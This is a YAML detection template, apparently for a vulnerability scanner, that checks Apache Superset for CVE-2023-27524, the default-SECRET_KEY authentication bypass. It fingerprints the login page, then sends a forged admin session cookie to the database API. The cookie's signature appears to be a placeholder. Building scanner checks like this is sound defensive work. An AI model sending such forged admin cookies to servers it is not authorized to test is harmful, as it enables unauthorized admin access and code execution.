id: CVE-2023-27524
name: "Apache Superset Default Secret Key Authentication Bypass"
severity: critical
description: "Apache Superset uses a default SECRET_KEY value that allows attackers to forge session cookies, authenticate as admin, and execute arbitrary code via the database connection feature."
reference: CWE-1188
confidence: confirmed
requests:
  - method: GET
    path: "/login/"
    matchers:
      - type: body
        words:
          - "Superset"
          - "csrf_token"
      - type: status
        status: [200]
    condition: and
  - method: GET
    path: "/api/v1/database/"
    headers:
      Cookie: "session=eyJfZnJlc2giOnRydWUsImNzcmZfdG9rZW4iOiJ0ZXN0IiwidXNlcl9pZCI6MX0.test.test"
    matchers:
      - type: body
        words:
          - "result"
          - "count"
      - type: status
        status: [200]
    condition: and
